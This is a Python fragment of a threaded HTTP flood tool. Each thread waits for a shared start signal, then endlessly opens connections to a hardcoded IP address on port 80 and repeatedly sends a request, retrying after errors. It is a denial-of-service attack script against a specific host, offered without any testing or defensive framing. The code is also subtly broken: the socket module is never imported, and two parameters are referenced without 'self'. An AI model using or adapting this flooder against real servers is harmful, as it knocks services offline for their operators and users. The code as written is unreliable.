import threading
import time

go = threading.Event()

class RequestHTTP(threading.Thread):

	def __init__(self,counter, req_socket,multiple, timeout=0):
		threading.Thread.__init__(self)
		self.counter = counter
		self.req_socket = req_socket
		self.multiple = multiple
		self.timeout = timeout

	def run(self):

		go.wait()
		while True:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			try:

				s.connect((str("213.171.196.225"), int(80)))


				for y in range(0, multiple):
					s.send(str.encode(req_socket))

				s.close()
			except:
				s.close()
				time.sleep(timeout)
